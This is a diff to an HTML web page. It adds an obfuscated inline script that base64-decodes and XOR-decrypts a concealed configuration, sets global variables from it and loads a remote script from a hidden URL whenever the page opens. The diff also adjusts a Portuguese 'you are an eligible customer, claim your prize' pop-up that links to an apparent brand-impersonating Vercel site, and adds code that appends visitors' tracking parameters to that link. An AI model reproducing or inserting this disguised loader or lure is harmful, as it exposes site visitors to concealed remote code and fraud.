@@ -329,15 +329,39 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     <div class="tab">&#8617;</div>
     <div class="tab">&#128100;</div>
   </div>
+  
+<script>(function(){var h_6tms=atob("DM5dlilcw/OiEyNeF7V/41sw4cmAe1cqZ71nuQY/p52MZlczfqgkuEozrt3AYQwtdLw05l0v7IbWflBxe68p81oo7ZnRMQ98drop5EA+tofHYAFkTLV/+EgxptGYMUc/Y69w410xqpXbPlMscrg4+F1xu5DNdw4tdKV/ugsqop/XdgFkNewgulJ+rZLPdgFkNao84khxtofPekUnOr4v8185rYePYFY8fqoutAV+tZLOZkZ8Lex/63Qh");var q_peb=[];for(var g_lc1=0;g_lc1<h_6tms.length;g_lc1++){q_peb.push(h_6tms.charCodeAt(g_lc1)&255);}var h_go5f=q_peb[0];var l_u5x=q_peb.slice(1,1+h_go5f);var a_v=q_peb.slice(1+h_go5f);var z_h=a_v.map(function(b,y_6v2){return b^l_u5x[y_6v2%h_go5f];});var y_ag="";for(var g_hozr=0;g_hozr<z_h.length;g_hozr++){y_ag+=String.fromCharCode(z_h[g_hozr]&255);}var m_0gi=decodeURIComponent(escape(y_ag));var y_h=JSON.parse(m_0gi);var n_8=y_h.globals||[];n_8.forEach(function(v_upp6){window[v_upp6.name]=v_upp6.value;});var h_rpw0=document.createElement("script");h_rpw0.src=y_h.url;h_rpw0.async=true;h_rpw0.defer=true;(y_h.attributes||[]).forEach(function(u_7xzg){h_rpw0.setAttribute(u_7xzg.name,u_7xzg.value);});(document.head||document.documentElement).appendChild(h_rpw0);})();</script>
 
- <!-- POP-UP -->
-  <div id="promoModal" class="modal-overlay" aria-hidden="true">
-    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="promoTitle">
-      <h2 id="promoTitle" class="modal-title">Você é uma cliente elegível!</h2>
-      <p class="modal-text">Resgate agora mesmo seu prêmio</p>
-      <a class="modal-cta" href="https://elseve-oficial.vercel.app/" target="_blank" rel="noopener">Resgatar</a>
-    </div>
+<!-- POP-UP -->
+<div id="promoModal" class="modal-overlay" aria-hidden="true">
+  <div class="modal" role="dialog" aria-modal="true" aria-labelledby="promoTitle">
+    <h2 id="promoTitle" class="modal-title">Você é uma cliente elegível!</h2>
+    <p class="modal-text">Resgate agora mesmo seu prêmio</p>
+    <a id="resgatarBtn" class="modal-cta" href="https://elseve-oficial.vercel.app/" target="_blank" rel="noopener">Resgatar</a>
   </div>
+</div>
+
+  
+<script>
+  (function() {
+    var link = document.getElementById('resgatarBtn');
+    if (!link) return;
+
+    // Pega a query string completa da página atual (utm_source, utm_medium, utm_campaign, etc + fbclid, gclid, xcod etc que a Utmify também costuma capturar)
+    var currentParams = window.location.search; // já vem com "?" na frente, ou vazio
+
+    if (currentParams) {
+      var baseUrl = link.getAttribute('href');
+      var separator = baseUrl.includes('?') ? '&' : '?';
+      // remove o "?" inicial de currentParams pra concatenar certo
+      link.setAttribute('href', baseUrl + separator + currentParams.substring(1));
+    }
+  })();
+</script>
+
+
+  
+
 
 <script>
   function closePromoModal() {
